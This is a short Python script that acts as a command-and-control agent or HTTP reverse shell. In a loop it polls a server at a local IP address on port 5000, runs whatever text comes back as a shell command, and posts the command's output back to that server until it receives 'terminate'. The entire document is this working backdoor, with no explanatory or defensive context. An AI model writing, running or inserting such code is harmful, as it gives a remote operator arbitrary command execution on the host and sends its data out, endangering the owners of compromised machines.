import requests, os, subprocess, time
while True:
    req = requests.get('http://192.168.15.16:5000')
    c2_command = req.text
    if 'terminate' in c2_command:
        break
    else:
        CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.15.16:5000', data=CMD.stdout.read())
